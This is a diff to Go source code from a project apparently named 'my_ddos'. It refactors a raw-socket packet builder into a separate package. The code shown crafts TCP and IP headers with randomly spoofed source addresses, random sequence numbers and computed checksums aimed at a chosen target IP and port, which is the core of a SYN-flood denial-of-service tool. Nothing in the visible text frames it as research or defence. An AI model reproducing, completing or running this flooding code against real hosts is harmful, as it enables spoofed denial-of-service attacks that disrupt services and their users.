@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
+	"my_ddos/MyFile"
 	"net"
 	"os"
 	"strconv"
@@ -27,7 +28,11 @@ func main() {
 		targetPortUint16 uint16
 	)
 	//创建套接字
-	syscall.Socket()
+	/*if fd , err = syscall.LoadLibrary("ws2_32.dll");err !=nil{
+		log.Println("加载dll文件出错：",err)
+		os.Exit(0)
+	}*/
+	//defer syscall.Close(fd)
 	if fd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP);err != nil {
 		log.Println("创建TCP套接字报错:", err)
 		os.Exit(-1)
@@ -65,7 +70,7 @@ func main() {
  */
 func createPacketHeader(targetIp string,targetPort uint16) []byte{
 	sourceAddr := createRandomIp()
-	packet := &TCPHeader{
+	packet := &MyFile.TCPHeader{
 		Source:      0xaa47, // Random ephemeral port
 		Destination: targetPort,
 		SeqNum:      rand.Uint32(),
@@ -77,7 +82,7 @@ func createPacketHeader(targetIp string,targetPort uint16) []byte{
 		Window:      0xaaaa, // size of your receive window
 		Checksum:    0,      // Kernel will set this if it's 0
 		Urgent:      0,
-		Options:     []TCPOption{},
+		Options:     []MyFile.TCPOption{},
 	}
 
 	sourcePartSlice := strings.Split(sourceAddr, ".")
@@ -90,7 +95,7 @@ func createPacketHeader(targetIp string,targetPort uint16) []byte{
 	d1, _ := strconv.Atoi(targetPartSlice[1])
 	d2, _ := strconv.Atoi(targetPartSlice[2])
 	d3, _ := strconv.Atoi(targetPartSlice[3])
-	h := &Header{
+	h := &MyFile.Header{
 		Version:  4,
 		Len:      20,
 		TotalLen: 20, // 20 bytes for IP + tcp
@@ -102,11 +107,11 @@ func createPacketHeader(targetIp string,targetPort uint16) []byte{
 		// ID, Src and Checksum will be set for us by the kernel
 	}
 	data := packet.Marshal()
-	packet.Checksum = Csum(data, ipSplitFourByte(sourceAddr), ipSplitFourByte(targetIp))
+	packet.Checksum = MyFile.Csum(data, ipSplitFourByte(sourceAddr), ipSplitFourByte(targetIp))
 	data = packet.Marshal()
 	h.TotalLen = h.TotalLen + 20
 	out, err := h.Marshal()
-	h.Checksum = int(Checksum(out))
+	h.Checksum = int(MyFile.Checksum(out))
 	out, err = h.Marshal()
 	if err != nil {
 		log.Fatal(err)
